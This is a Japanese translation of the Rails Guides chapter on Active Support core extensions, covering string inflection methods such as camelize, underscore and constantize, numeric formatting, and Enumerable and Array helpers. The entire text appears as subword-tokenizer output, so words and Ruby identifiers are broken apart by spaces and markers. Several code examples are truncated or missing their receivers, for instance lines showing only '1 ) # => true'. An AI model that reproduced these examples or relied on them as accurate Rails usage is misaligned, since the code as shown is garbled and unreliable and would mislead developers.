▁" admin _ user ". camelize ▁# ▁=> ▁" Admin User "
▁このメソッドは 、 パス を Ruby の クラス に変換 するときに も よく 使用されます 。 ス ラ ッ シ ュ で 区切 られ ている パス は 「 :: 」 で 区切 られます 。
▁" b ack of fi ce / session ". camelize ▁# ▁=> ▁" B ack of fi ce :: Session "
▁たとえば Action ▁P ack では 、 特定の セッション スト ア を 提 供 する クラス を 読み込む の に このメソッド を使用しています 。
▁# ▁ action _ controller / me t al / session _ ma n a gem ent . rb
▁def ▁ session _ store = ( store )
▁@ @ session _ store ▁= ▁ store . is _ a ? (
▁S y m b ol ) ▁ ?
▁ ActionDispatch :: Session . const _ get ( store . to _ s . camelize ) ▁:
▁ store
▁` camelize ` メソッドは オプション の 引数 を 受け 付け ます 。 使用できる のは `: up per ` ▁( デフォルト ) ▁ または `: lo w er ` です 。
▁ 後 者 を指定すると 、 冒 頭 が 小文字 になります 。
▁" v is u al _ e f f e ct ". camelize (: lo w er ) ▁# ▁=> ▁" v is u al E f f e ct "
▁このメソッドは 、 そのような 命 名 慣習 に従って いる 言語 ▁( JavaScript など ) ▁ で 使用される 名前 を 求 め る の に 便利です 。
▁INFO : ▁` ca m er ize ` メソッド の動作 は 、` underscore ` メソッドと 逆 の動作 と 考え ると わかり やすい でしょう 。 ただし 完全に 逆 の動作 ではありません 。 たとえば 、` " SSL Error ". underscore . camelize ` を実行し た 結果 は ` " S s l Error " ` になり 、 元に戻 り ません 。
▁ このような 場合 を サポート するために 、 Active ▁Support では ` config / initializers / in f le ct ions . rb ` の 頭 字 語 を指定する ことができます 。
▁in f le ct . a c r on y m ▁' SSL '
▁" SSL Error ". underscore . camelize ▁# ▁=> ▁" SSL Error "
▁` camelize ` は ` ca me l case ` の別名 です 。
▁#### ▁` underscore `
▁` underscore ` メソッドは 上 と 逆 に 、 キ ャ メ ル ケース を パス に変換 します 。
▁" Product ". underscore ▁# ▁=> ▁" product "
▁" Admin User ". underscore ▁# ▁=> ▁" admin _ user "
▁" :: " も " / " に 逆 変 換 されます 。
▁" B ack of fi ce :: Session ". underscore ▁# ▁=> ▁" b ack of fi ce / session "
▁ 小文字 で 始 ま る 文字列 も 扱 え ます 。
▁" v is u al E f f e ct ". underscore ▁# ▁=> ▁" v is u al _ e f f e ct "
▁ただし ` underscore ` は 引数 を 取り ません 。
▁Rails で 自動的に 読み込まれ る クラス と モジュール は 、` underscore ` メソッドを使用して ファイルの 拡張子 を 除 いた 相 対 パス を 推測 し 、 指定された 定数 が 失 わ れ ている 場合に それ を定義する の に 役 立 て ます 。
▁# ▁ active _ support / de p end en c ies . rb
▁def ▁ load _ m is s ing _ const an t ( from _ mod , ▁ const _ name )
▁ qualified _ name ▁= ▁ qualified _ name _ for ▁ from _ mod , ▁ const _ name
▁ path _ s u f fi x ▁= ▁ qualified _ name . underscore
▁INFO : ▁` underscore ` メソッド の動作 は 、` camelize ` メソッドと 逆 の動作 と 考え ると わかり やすい でしょう 。 ただし 完全に 逆 の動作 ではありません 。
▁たとえば 、` " SSL Error ". underscore . camelize ` を実行し た 結果 は ` " S s l Error " ` になり 、 元に戻 り ません 。
▁#### ▁` title ize `
▁` title ize ` メソッドは 、 レシーバ の 語 の 1 文字 目 を 大文字 に します 。
▁" a li ce ▁in ▁ w o nder l and ". title ize ▁# ▁=> ▁" A li ce ▁ In ▁ W o nder l and "
▁" f e rm at ' s ▁ en ig ma ". title ize ▁# ▁=> ▁" F e rm at ' s ▁ E n ig ma "
▁` title ize ` メソッドは ` title case ` の別名 です 。
▁#### ▁` d as her ize `
▁` d as her ize ` メソッドは 、 レシーバ の アンダースコア 文字 を ダ ッ シ ュ に置き換え ます ( 訳 注 : ▁ ここ で言う ダ ッ シ ュ は 実際には 「 ハ イ フ ン マ イ ナ ス 文字 」( U + 00 2 D ) です )。
▁" name ". d as her ize ▁# ▁=> ▁" name "
▁" contact _ data ". d as her ize ▁# ▁=> ▁" contact - data "
▁ モデルの XML シ リ ア ラ イ ザ では この メソッドを使用して ノ ー ド 名を ダ ッ シ ュ 化 しています 。
▁# ▁ active _ model / s e ri al ize r s / xml . rb
▁def ▁ re format _ name ( name )
▁name ▁= ▁name . camelize ▁if ▁ camelize ?
▁d as her ize ? ▁ ?
▁name . d as her ize ▁: ▁name
▁#### ▁` de mod ul ize `
▁` de mod ul ize ` メソッドは 、 フル パス の ▁( qualified ) ▁ 定数 名を 与え られ ると 、 パス 部分を 取り 除 いて 右 側 の 定数 名 だけ にしたもの を返します 。
▁" Product ". de mod ul ize ▁# ▁=> ▁" Product "
▁" B ack of fi ce :: Users Controller ". de mod ul ize ▁# ▁=> ▁" Users Controller "
▁" Admin :: H o te l :: Re s er v ation U t il s ". de mod ul ize ▁# ▁=> ▁" Re s er v ation U t il s "
▁" :: In f le ct ions ". de mod ul ize ▁# ▁=> ▁" In f le ct ions "
▁" ". de mod ul ize ▁# ▁=> ▁" "
▁以下の Active ▁Record の例 では 、 この メソッドを使用して counter _ cache カラム の名前 を 求 め ています 。
▁def ▁ counter _ cache _ column
▁if ▁ options [: counter _ cache ] ▁= = ▁true
▁" # { active _ record . name . de mod ul ize . underscore . pluralize } _ count "
▁ e l s if ▁ options [: counter _ cache ]
▁ options [: counter _ cache ]
▁#### ▁` de constantize `
▁` de constantize ` メソッドは 、 フル パス の 定数 を表す 参 照 表現 を 与え られ ると 、 一 番 右 の 部分 ▁( 通常 は 定数 名 ) ▁ を 取り 除 きます 。
▁" Product ". de constantize ▁# ▁=> ▁" "
▁" B ack of fi ce :: Users Controller ". de constantize ▁# ▁=> ▁" B ack of fi ce "
▁" Admin :: H o te l :: Re s er v ation U t il s ". de constantize ▁# ▁=> ▁" Admin :: H o te l "
▁以下の Active ▁Record の例 では 、` M o d ul e # qualified _ const _ set ` で このメソッド を使用しています 。
▁def ▁ qualified _ const _ set ( path , ▁ value )
▁ Q u al ified Co n st U t il s . raise _ if _ a b s ol u te ( path )
▁ const _ name ▁= ▁ path . de mod ul ize
▁ mod _ name ▁= ▁ path . de constantize
▁ mod ▁= ▁ mod _ name . empty ? ▁ ?
▁self ▁: ▁ qualified _ const _ get ( mod _ name )
▁ mod . const _ set ( const _ name , ▁ value )
▁#### ▁` param e ter ize `
▁` param e ter ize ` メソッドは 、 レシーバ を 正しい URL で 使用 可能な 形式 に 正 規 化 します 。
▁" John ▁S m i th ". param e ter ize ▁# ▁=> ▁" j o h n - s m i th "
▁" K ur t ▁ G ö de l ". param e ter ize ▁# ▁=> ▁" k ur t - g o de l "
▁ 実際に 得られ る 文字列 は 、` ActiveSupport :: M ulti by te :: C h ar s ` の インスタンス で ラ ッ プ されています 。
▁#### ▁` table ize `
▁` table ize ` メソッドは 、` underscore ` の 次に ` pluralize ` を実行し た ものです 。
▁" Person ". table ize ▁# ▁=> ▁" people "
▁" In v o i ce ". table ize ▁# ▁=> ▁" in v o i ce s "
▁" In v o i ce L in e ". table ize ▁# ▁=> ▁" in v o i ce _ line s "
▁ 単純な 場合 であれば 、 モデル名 に ` table ize ` を使用すると モデルの テーブル 名を 得られ ます 。
▁ 実際の Active ▁Record の実装 は 、 単 に ` table ize ` を実行する 場合 よりも 複 雑 です 。 Active ▁Record では クラス名 に対して ` de mod ul ize ` も 行 っ ており 、 返される 文字列 に 影 響 する 可能性 のある オプション も いくつか チェック しています 。
▁#### ▁` class if y `
▁` class if y ` メソッドは 、` table ize ` と 逆 の動作 です 。
▁ 与えられた テーブル 名 に対応する クラス名 を返します 。
▁" people ". class if y ▁# ▁=> ▁" Person "
▁" in v o i ce s ". class if y ▁# ▁=> ▁" In v o i ce "
▁" in v o i ce _ line s ". class if y ▁# ▁=> ▁" In v o i ce L in e "
▁このメソッドは 、 フル パス の ▁( qualified ) ▁ テーブル 名 も 扱 え ます 。
▁" h ig h ri s e _ production . com p an ies ". class if y ▁# ▁=> ▁" Co m p any "
▁` class if y ` が 返す クラス名 は 文字列 である ことにご注意ください 。
▁ 得られ た 文字列 に対して ` constantize ` ▁( 後 述 ) ▁ を実行する ことで 本 当 の クラス オブジェクトを 得られ ます 。
▁#### ▁` constantize `
▁` constantize ` メソッドは 、 レシーバ の 定数 参 照 表現 を 解決 し 、 実際の オブジェクト を返します 。
▁" M :: X ". constantize ▁# ▁=> ▁1
▁ 与えられた 文字列を ` constantize ` メソッドで 評価 しても 既 知 の 定数 と マッチ しない 、 または 指定された 定数 名 が正しく ない場合は ` Name Error ` が発生し ます 。
▁` constantize ` メソッド による 定数 名 解決 は 、 常に ト ッ プ レベル の ` Object ` から 開 始 されます 。 これは 上 位 に " :: " が ない場合 でも 同じです 。
▁X ▁= ▁: in _ Object
▁X ▁= ▁: in _ M
▁X ▁# ▁=> ▁: in _ M
▁" :: X ". constantize ▁# ▁=> ▁: in _ Object
▁" X ". constantize ▁# ▁=> ▁: in _ Object ▁( ! )
▁従って 、 このメソッドは 、 同じ 場所 で Ruby が 定数 を 評価 した とき の値 と 必ず し も 等 価 ではありません 。
▁ メイラー ▁( mailer ) ▁ のテスト ケース では 、 テスト する クラス の名前 から テスト 対象 の メイラー を 取得 するのに ` constantize ` メソッド を使用します 。
▁# ▁ action _ mailer / test _ case . rb
▁def ▁ de ter m in e _ default _ mailer ( name )
▁name . sub ( / Test $ / , ▁' ') . constantize
▁ re sc u e ▁ Name Error ▁=> ▁ e
▁ raise ▁ No n In f er r able Mailer Error . new ( name )
▁#### ▁` human ize `
▁` human ize ` メソッドは 、 属性 名を ▁( 英語 的に ) ▁ 読み やすい 表 記 に変換 します 。
▁ 具体的には 以下の 変 換 を行います 。
▁* ▁ 引数に ▁( 英語 の ) ▁ 活用 ルール を 適 用 します ( in f le c tion )。
▁* ▁ 冒 頭 に アンダースコア がある場合 は 削除 します 。
▁* ▁ 末尾 に " _ id " がある場合 は 削除 します 。
▁* ▁ アンダースコア が 他にも ある 場合は スペース に置き換え ます 。
▁* ▁ 略 語 を 除 いて すべての 単 語 を 小文字 に します ( downcase )。
▁* ▁ 最初の 単 語 だけ 冒 頭 の 文字 を 大文字 に します ( c api t al ize )。
▁` c api t al ize ` オプションを false に すると 、 冒 頭 の 文字 は 大文字 に されません ( デフォルト は true )。
▁" name ". human ize ▁# ▁=> ▁" Name "
▁" author _ id ". human ize ▁# ▁=> ▁" A u th or "
▁" author _ id ". human ize ( c api t al ize : ▁false ) ▁# ▁=> ▁" author "
▁" comments _ count ". human ize ▁# ▁=> ▁" Comment s ▁ count "
▁" _ id ". human ize ▁# ▁=> ▁" I d "
▁" SSL " が 頭 字 語 と 定義されている 場合は 以下のように エラー になります 。
▁' s s l _ error ' . human ize ▁# ▁=> ▁" SSL ▁ error "
▁ ヘルパーメソッド ` full _ messages ` では 、 属性 名を メッセージ に含め る ときに ` human ize ` を使用しています 。
▁def ▁ full _ messages
▁ ma p ▁ { ▁| attribute , ▁ message | ▁ full _ message ( attribute , ▁ message ) ▁ }
▁def ▁ full _ message
▁ attr _ name ▁= ▁ attribute . to _ s . tr (' . ', ▁' _ ') . human ize
▁ attr _ name ▁= ▁@ base . class . human _ attribute _ name ( attribute , ▁ default : ▁ attr _ name )
▁#### ▁` foreign _ key `
▁` foreign _ key ` メソッドは 、 クラス名 から 外部キー カラム 名を 求 め る 時に 使用します 。
▁ 具体的には 、` de mod ul ize `、` underscore ` を実行し 、 末尾 に ▁" _ id " ▁ を追加します 。
▁" User ". foreign _ key ▁# ▁=> ▁" user _ id "
▁" In v o i ce L in e ". foreign _ key ▁# ▁=> ▁" in v o i ce _ line _ id "
▁" Admin :: Session ". foreign _ key ▁# ▁=> ▁" session _ id "
▁ 末尾 の ▁" _ id " ▁ の アンダースコア が 不要な 場合は 引数に ` false ` を指定します 。
▁" User ". foreign _ key ( false ) ▁# ▁=> ▁" user id "
▁ 関連付け ▁( association ) ▁ では 、 外部キー の名前 を 推測 するときに このメソッド を使用します 。 たとえば ` has _ one ` と ` has _ many ` では 以下 を行って います 。
▁# ▁ active _ record / association s . rb
▁ foreign _ key ▁= ▁ options [: foreign _ key ] ▁| | ▁ ref le c tion . active _ record . name . foreign _ key
▁### ▁ 各 種 変 換
▁#### ▁` to _ date `、` to _ time `、` to _ date time `
▁` to _ date `、` to _ time `、` to _ date time ` メソッドは 、` Date . _ p ar s e ` を ラ ッ プ して 使い や す く します 。
▁" 20 10 - 07 - 27 ". to _ date ▁# ▁=> ▁Tue , ▁ 27 ▁Ju l ▁2010
▁" 20 10 - 07 - 27 ▁ 23 : 3 7 : 00 ". to _ time ▁# ▁=> ▁Tue ▁Ju l ▁ 27 ▁ 23 : 3 7 : 00 ▁ UTC ▁2010
▁" 20 10 - 07 - 27 ▁ 23 : 3 7 : 00 ". to _ date time ▁# ▁=> ▁Tue , ▁ 27 ▁Ju l ▁2010 ▁ 23 : 3 7 : 00 ▁+0000
▁` to _ time ` は オプション で `: u t c ` や `: local ` を 引数に 取り 、 タイムゾーン を指定する ことができます 。
▁" 20 10 - 07 - 27 ▁ 23 : 4 2 : 00 ". to _ time (: u t c ) ▁# ▁=> ▁Tue ▁Ju l ▁ 27 ▁ 23 : 4 2 : 00 ▁ UTC ▁2010
▁" 20 10 - 07 - 27 ▁ 23 : 4 2 : 00 ". to _ time (: local ) ▁# ▁=> ▁Tue ▁Ju l ▁ 27 ▁ 23 : 4 2 : 00 ▁+ 0 200 ▁2010
▁デフォルトは `: u t c ` です 。
▁詳細については ` Date . _ p ar s e ` の ドキュメント を参照してください 。
▁INFO : ▁3 つの メソッドは いずれ も 、 レシーバ が 空 の場合は ` nil ` を返します 。
▁NOT E : ▁ 定義ファイル の場所は ` active _ support / core _ ext / string / con version s . rb ` です 。
▁` N um e ri c ` の 拡 張
▁### ▁ バ イ ト
▁ すべての 数値 は 、 以下の メソッド に 応答 します 。
▁ k il o by te s
▁ me g a by te s
▁ g ig a by te s
▁ ter a by te s
▁ p e t a by te s
▁ ex a by te s
▁これらの メソッドは 、 対応する バ イ ト 数 を返す ときに 10 2 4 の 倍 数 を使用します 。
▁2 . k il o by te s ▁# ▁=> ▁20 4 8
▁3 . me g a by te s ▁# ▁=> ▁3 14 5 7 28
▁3 . 5 . g ig a by te s ▁# ▁=> ▁3 7 5 8 0 9 6 3 8 4
▁- 4 . ex a by te s ▁# ▁=> ▁- 4 6 1 16 8 6 0 18 4 27 3 8 7 9 04
▁これらの メソッド には 単数形 の別名 もあります 。
▁1. me g a by te ▁# ▁=> ▁10 4 8 5 7 6
▁NOT E : ▁ 定義ファイル の場所は ` active _ support / core _ ext / n um e ri c / by te s . rb ` です 。
▁### ▁ Time
▁たとえば ` 4 5 . minute s ▁+ ▁2 . hour s ▁+ ▁4 . year s ` のように 時間 の 計算 や 宣言 を行なう ことができます 。
▁これらの メソッド では 、 from _ now や ago など を使用した り 、 または Time オブジェクト から 得 た 結果 の 加 減 算 を行なう 際に 、 Time # advance を使用して 正 確 な 日付 計算 を行って います 。
▁# ▁ Time . current . advance ( month s : ▁1 ) ▁ と 等 価
▁1. month . from _ now
▁# ▁ Time . current . advance ( year s : ▁2 ) ▁ と 等 価
▁2 . year s . from _ now
▁# ▁ Time . current . advance ( month s : ▁4 , ▁ year s : ▁5 ) ▁ と 等 価
▁( 4 . month s ▁+ ▁5 . year s ). from _ now
▁### ▁ フ ォ ー マ ッ テ ィ ング
▁ 数値 は さまざまな 方法で フォーマット できます 。
▁ 以下のように 、 数値 を 電 話 番号 形式 の 文字列 に変換 できます 。
▁5 5 5 1 23 4 . to _ s (: ph one )
▁# ▁=> ▁5 5 5 - 1 23 4
▁1 23 5 5 5 1 23 4 . to _ s (: ph one )
▁# ▁=> ▁1 23 - 5 5 5 - 1 23 4
▁1 23 5 5 5 1 23 4 . to _ s (: ph one , ▁are a _ code : ▁true )
▁# ▁=> ▁( 1 23 ) ▁5 5 5 - 1 23 4
▁1 23 5 5 5 1 23 4 . to _ s (: ph one , ▁ de limit er : ▁" ▁" )
▁# ▁=> ▁1 23 ▁5 5 5 ▁1 23 4
▁1 23 5 5 5 1 23 4 . to _ s (: ph one , ▁are a _ code : ▁true , ▁ ext en s ion : ▁5 5 5 )
▁# ▁=> ▁( 1 23 ) ▁5 5 5 - 1 23 4 ▁ x ▁5 5 5
▁1 23 5 5 5 1 23 4 . to _ s (: ph one , ▁ count ry _ code : ▁1 )
▁# ▁=> ▁+ 1 - 1 23 - 5 5 5 - 1 23 4
▁ 以下のように 、 数値 を 通 貨 形式 の 文字列 に変換 できます 。
▁1 23 4 5 6 7 8 9 0 . 50 . to _ s (: c ur re n c y ) ▁# ▁=> ▁$ 1 , 23 4 , 5 6 7 , 8 9 0 . 50
▁1 23 4 5 6 7 8 9 0 . 5 06 . to _ s (: c ur re n c y ) ▁# ▁=> ▁$ 1 , 23 4 , 5 6 7 , 8 9 0 . 5 1
▁1 23 4 5 6 7 8 9 0 . 5 06 . to _ s (: c ur re n c y , ▁ pre c is ion : ▁3 ) ▁# ▁=> ▁$ 1 , 23 4 , 5 6 7 , 8 9 0 . 5 06
▁ 以下のように 、 数値 を 百 分 率 形式 の 文字列 に変換 できます 。
▁ 100 . to _ s (: per c ent age )
▁# ▁=> ▁ 100 . 000 %
▁ 100 . to _ s (: per c ent age , ▁ pre c is ion : ▁0 )
▁# ▁=> ▁ 100 %
▁1 000 . to _ s (: per c ent age , ▁ de limit er : ▁' . ', ▁ s e p ar at or : ▁ ', ')
▁# ▁=> ▁1. 000 , 000 %
▁ 30 2 . 2 4 3 9 8 9 23 4 23 . to _ s (: per c ent age , ▁ pre c is ion : ▁5 )
▁# ▁=> ▁ 30 2 . 2 4 3 99 %
▁ 以下のように 、 数値 の 桁 区切 り を追加して 文字列 形式 に できます 。
▁1 23 4 5 6 7 8 . to _ s (: de limit ed ) ▁# ▁=> ▁1 2, 3 4 5 , 6 7 8
▁1 23 4 5 6 7 8 . 0 5 . to _ s (: de limit ed ) ▁# ▁=> ▁1 2, 3 4 5 , 6 7 8 . 0 5
▁1 23 4 5 6 7 8 . to _ s (: de limit ed , ▁ de limit er : ▁" . ")
▁# ▁=> ▁ 12 . 3 4 5 . 6 7 8
▁1 23 4 5 6 7 8 . to _ s (: de limit ed , ▁ de limit er : ▁ ", ") ▁# ▁=> ▁1 2, 3 4 5 , 6 7 8
▁1 23 4 5 6 7 8 . 0 5 . to _ s (: de limit ed , ▁ s e p ar at or : ▁" ▁" ) ▁# ▁=> ▁1 2, 3 4 5 , 6 7 8 ▁0 5
▁ 以下のように 、 数字 を 特定の 精 度 に 丸 め て 文字列 形式 に できます 。
▁1 11 . 23 4 5 . to _ s (: r ound ed ) ▁# ▁=> ▁1 11 . 23 5
▁1 11 . 23 4 5 . to _ s (: r ound ed , ▁ pre c is ion : ▁2 ) ▁# ▁=> ▁1 11 . 23
▁1 3 . to _ s (: r ound ed , ▁ pre c is ion : ▁5 ) ▁# ▁=> ▁1 3.0 0 000
▁3 8 9 . 3 23 14 . to _ s (: r ound ed , ▁ pre c is ion : ▁0 ) ▁# ▁=> ▁3 8 9
▁1 11 . 23 4 5 . to _ s (: r ound ed , ▁ sign if i ca n t : ▁true ) ▁# ▁=> ▁1 11
▁ 以下のように 、 数値 を 人 間 にとって 読み やすい バ イ ト 数 形式 の 文字列 に変換 できます 。
▁1 23 . to _ s (: human _ size ) ▁# ▁=> ▁1 23 ▁B y te s
▁1 23 4 . to _ s (: human _ size ) ▁# ▁=> ▁1. 2 1 ▁ K B
▁1 23 4 5 . to _ s (: human _ size ) ▁# ▁=> ▁1 2.1 ▁ K B
▁1 23 4 5 6 7 . to _ s (: human _ size ) ▁# ▁=> ▁1. 18 ▁ M B
▁1 23 4 5 6 7 8 9 0 . to _ s (: human _ size ) ▁# ▁=> ▁1. 15 ▁ G B
▁1 23 4 5 6 7 8 9 0 1 23 . to _ s (: human _ size ) ▁# ▁=> ▁1. 12 ▁ T B
▁ 以下のように 、 数値 を 人 間 にとって 読み やすい バ イ ト 数 形式 で 単 位 が 単 語 の 文字列 に変換 できます 。
▁1 23 . to _ s (: human ) ▁# ▁=> ▁" 1 23 "
▁1 23 4 . to _ s (: human ) ▁# ▁=> ▁" 1 . 23 ▁ T h o us and "
▁1 23 4 5 . to _ s (: human ) ▁# ▁=> ▁" 12 . 3 ▁ T h o us and "
▁1 23 4 5 6 7 . to _ s (: human ) ▁# ▁=> ▁" 1 . 23 ▁ M i ll ion "
▁1 23 4 5 6 7 8 9 0 . to _ s (: human ) ▁# ▁=> ▁" 1 . 23 ▁B i ll ion "
▁1 23 4 5 6 7 8 9 0 1 23 . to _ s (: human ) ▁# ▁=> ▁" 1 . 23 ▁ T ri ll ion "
▁1 23 4 5 6 7 8 9 0 1 23 4 5 6 . to _ s (: human ) ▁# ▁=> ▁" 1 . 23 ▁ Q u ad ri ll ion "
▁NOT E : ▁ 定義ファイル の場所は ` active _ support / core _ ext / n um e ri c / con version s . rb ` です 。
▁` In te g er ` の 拡 張
▁### ▁` m ulti p le _ of ?
▁` m ulti p le _ of ?` メソッドは 、 レシーバ の 整 数 が 引数 の 倍 数 である かどうか をテストします 。
▁1 ) ▁# ▁=> ▁true
▁2 ) ▁# ▁=> ▁false
▁NOT E : ▁ 定義ファイル の場所は ` active _ support / core _ ext / integer / m ulti p le . rb ` です 。
▁### ▁` ordinal `
▁` ordinal ` メソッドは 、 レシーバ の 整 数 に対応する 序 数 の サ フ ィ ッ ク ス 文字列 を返します 。
▁1. ordinal ▁# ▁=> ▁" st "
▁2 . ordinal ▁# ▁=> ▁" n d "
▁5 3 . ordinal ▁# ▁=> ▁" r d "
▁ 200 9 . ordinal ▁# ▁=> ▁" th "
▁- 2 1 . ordinal ▁# ▁=> ▁" st "
▁- 1 3 4 . ordinal ▁# ▁=> ▁" th "
▁NOT E : ▁ 定義ファイル の場所は ` active _ support / core _ ext / integer / in f le ct ions . rb ` です 。
▁### ▁` ordinal ize `
▁` ordinal ize ` メソッドは 、 レシーバ の 整 数 に 、 対応する 序 数 文字列 を追加した もの を か え します 。
▁ 先に 紹 介 した ` ordinal ` メソッドは 、 序 数 文字列 ▁** だけ ** ▁ を返す 点が 異なる ことにご注意ください 。
▁1. ordinal ize ▁# ▁=> ▁" 1 st "
▁2 . ordinal ize ▁# ▁=> ▁" 2 n d "
▁5 3 . ordinal ize ▁# ▁=> ▁" 5 3 r d "
▁- 2 1 . ordinal ize ▁# ▁=> ▁" - 2 1 st "
▁- 1 3 4 . ordinal ize ▁# ▁=> ▁" - 1 3 4 th "
▁` B ig D ec im al ` の 拡 張
▁### ▁` to _ s `
▁この ` to _ s ` メソッドは 、` to _ formatted _ s ` メソッド の別名 です 。
▁このメソッドは 、 浮 動 小 数 点 記 法 の B ig D ec im al 値 を簡単に 表示 するための 便利な 方法 を提供します 。
▁B ig D ec im al . new ( 5 . 00 , ▁ 6 ). to _ s ▁# ▁=> ▁" 5 . 0 "
▁### ▁` to _ formatted _ s `
▁この ` to _ formatted _ s ` メソッドは 、 " F " の デフォルトの 指定 部 ▁( spec if i er ) ▁ を提供します 。
▁これは 、` to _ formatted _ s ` または ` to _ s ` を 単 に 呼 び 出 す と 、 エ ン ジ ニ ア リ ング 記 法 ▁( ' 0 . 5 E 1 ' のような 記 法 ) ▁ ではなく 浮 動 小 数 点 記 法 を 得られ る ということです 。
▁B ig D ec im al . new ( 5 . 00 , ▁ 6 ). to _ formatted _ s ▁# ▁=> ▁" 5 . 0 "
▁また 、 シンボル を使用した 指定 部 も サポート されます 。
▁B ig D ec im al . new ( 5 . 00 , ▁ 6 ). to _ formatted _ s (: db ) ▁# ▁=> ▁" 5 . 0 "
▁ エ ン ジ ニ ア リ ング 記 法 も 従来 通 り サポート されます 。
▁B ig D ec im al . new ( 5 . 00 , ▁ 6 ). to _ formatted _ s (" e ") ▁# ▁=> ▁" 0 . 5 E 1 "
▁` E n um er able ` の 拡 張
▁### ▁` sum `
▁` sum ` メソッドは enumera b le の 要素 を 合 計 します 。
▁[1, ▁ 2, ▁3 ] . sum ▁# ▁=> ▁ 6
▁( 1 . . 100 ). sum ▁# ▁=> ▁ 50 50
▁` + ` に応答する 要素 のみ が 加 算 の 対象 として 前 提 と されます 。
▁[ [ 1 , ▁2 ] , ▁[ 2, ▁3 ] , ▁[ 3, ▁4 ] ] . sum ▁# ▁=> ▁[1, ▁ 2, ▁ 2, ▁ 3, ▁ 3, ▁4 ]
▁% w ( foo ▁ bar ▁ baz ). sum ▁# ▁=> ▁" foo bar baz "
▁ { a : ▁1, ▁ b : ▁ 2, ▁c : ▁3 } . sum ▁# ▁=> ▁ [: b , ▁ 2, ▁: c , ▁ 3, ▁: a , ▁1 ]
▁ 空 の コレクション はデフォルトで は ゼ ロ を返します が 、 この 動作 は カスタマイズ 可能です 。
▁[ ] . sum ▁# ▁=> ▁0
▁[ ] . sum (1) ▁# ▁=> ▁1
▁ ブロック が与えられ た場合 、` sum ` は イ テ レ ー タ になって コレクション の 要素 を yield し 、 そこ から 返 された 値を 合 計 します 。
▁( 1 . . 5 ). sum ▁ { | n | ▁ n ▁* ▁2 ▁ } ▁# ▁=> ▁ 30
▁[ 2, ▁4 , ▁ 6 , ▁ 8 , ▁10 ] . sum ▁# ▁=> ▁ 30
▁ ブロック を与える 場合に も 、 レシーバ が 空 のとき の デフォルト値 を カスタマイズ できます 。
▁[ ] . sum (1) ▁ { | n | ▁ n ** 3 } ▁# ▁=> ▁1
▁NOT E : ▁ 定義ファイル の場所は ` active _ support / core _ ext / enumera b le . rb ` です 。
▁### ▁` index _ by `
▁` index _ by ` メソッドは 、 何らかの キー によって インデックス 化 された enumera b le の 要素 を持つ ハッシュ を生成します 。
▁このメソッドは コレクション を 列 挙 し 、 各 要素 を ブロック に 渡します 。
▁この 要素 は 、 ブロック から 返 された 値 によって インデックス 化 されます 。
▁invo i ce s . index _ by ( & : number )
▁# ▁=> ▁ { ' 200 9 - 0 3 2 ' ▁=> ▁< In v o i ce ▁ ...
▁ > , ▁' 200 9 - 00 8 ' ▁=> ▁< In v o i ce ▁ ...
▁ > , ▁ ... }
▁WARN ING : ▁ キー は 通常 は ユ ニ ー ク で なければなりません 。
▁ 異なる 要素 から 同じ 値が 返される と 、 その キー の コレクション は 作成 されません 。
▁ 返 された 項目 のうち 、 最後の 項目 だけ が使用されます 。
▁NOT E : ▁ 定義ファイル の場所は ` active _ support / core _ ext / enumera b le . rb ` です
▁### ▁` many ?
▁` many ?` メソッドは 、` collection . size ▁ > ▁1 ` の 短縮 形 です 。
▁<% ▁if ▁ pages . many ?
▁<%= ▁ pagination _ links ▁%>
▁` many ?` は 、 ブロック が オプション として 与え られ ると 、 true を返す 要素 だけ を 扱 います 。
▁@ s e e _ m or e ▁= ▁ video s . many ?
▁ { | video | ▁ video . category ▁= = ▁ params [: category ]}
▁### ▁` ex c l u de ?
▁` ex c l u de ?` 述 語 は 、 与えられた オブジェクトが その コレクション に 属 して ▁** い ない ** ▁ かどうか をテストします 。
▁` include ?` の 逆 の動作 です 。
▁to _ v is it ▁< < ▁ no de ▁if ▁ v is it ed . ex c l u de ? (
▁` Array ` の 拡 張
▁### ▁A c c ess ing
▁Active ▁Support には 配列 の API が 多 数 追加 され ており 、 配列 に 容易に アクセス できる ようになっています 。
▁たとえば ` to ` メソッドは 、 配列 の 冒 頭 から 、 渡 された インデックス が 示す 箇所 まで の 範囲 を返します 。
▁% w ( a ▁ b ▁c ▁d ). to (2) ▁# ▁=> ▁% w ( a ▁ b ▁c )
▁[ ] . to ( 7 ) ▁# ▁=> ▁[ ]
▁ 同様に ` from ` メソッドは 、 配列 のうち 、 インデックス が 指 す 箇所 から 末尾 まで の 要素 を返します 。
▁ インデックス が 配列 の サイズ より 大 き い 場合は 、 空 の配列 を返します 。
▁% w ( a ▁ b ▁c ▁d ). from (2) ▁# ▁=> ▁% w ( c ▁d )
▁% w ( a ▁ b ▁c ▁d ). from ( 10 ) ▁# ▁=> ▁[ ]
▁[ ] . from ( 0 ) ▁# ▁=> ▁[ ]
▁` sec on d `、` th ir d `、` f our th `、` f if th ` は 、 対応する 位 置 の 要素 を返します ▁( ` first ` は 元 から ビルトイン されています )。
▁ 社 会 の 智慧 と 建 設 的な 姿勢 の おかげで 、 今 では ` for t y _ two ` も 使用できます ▁( 訳 注 : ▁[ Rails ▁2 . 2 ▁ 以降 ]( https :// github . com / rails / rails / commit / 9 d 8 c c 6 0 ec 3 8 4 5 fa 3 e 6 f 9 2 9 2 a 6 5 b 1 19 f e 4 f 6 19 f 7 e ) で 使 え ます 。 「 4 2 」 については 、 W ikipedia の [ 生 命 、 宇宙 、 そして 万 物 について の 究 極 の 疑 問 の 答 え ]( http :// j a . w ikipedia . org / wiki / % E 7 % 9 4 % 9 F % E 5 % 9 1 % B D % E 3 % 8 0 % 8 1 % E 5 % A E % 8 7 % E 5 % A E % 99 % E 3 % 8 0 % 8 1 % E 3 % 8 1 % 9 D % E 3 % 8 1 % 9 7 % E 3 % 8 1 % A 6 % E 4 % B 8 % 8 7 % E 7 % 8 9 % A 9 % E 3 % 8 1 % A B % E 3 % 8 1 % A 4 % E 3 % 8 1 % 8 4 % E 3 % 8 1 % A 6 % E 3 % 8 1 % A E % E 7 % A 9 % B 6 % E 6 % A 5 % B 5 % E 3 % 8 1 % A E % E 7 % 9 6 % 9 1 % E 5 % 9 5 % 8 F % E 3 % 8 1 % A E % E 7 % A D % 9 4 % E 3 % 8 1 % 88 ) を参照してください )。
▁% w ( a ▁ b ▁c ▁d ). th ir d ▁# ▁=> ▁c
▁% w ( a ▁ b ▁c ▁d ). f if th ▁# ▁=> ▁nil
▁NOT E : ▁ 定義ファイル の場所は ` active _ support / core _ ext / array / access . rb ` です 。
▁### ▁ 要素 を加え る
▁#### ▁` pre p end `
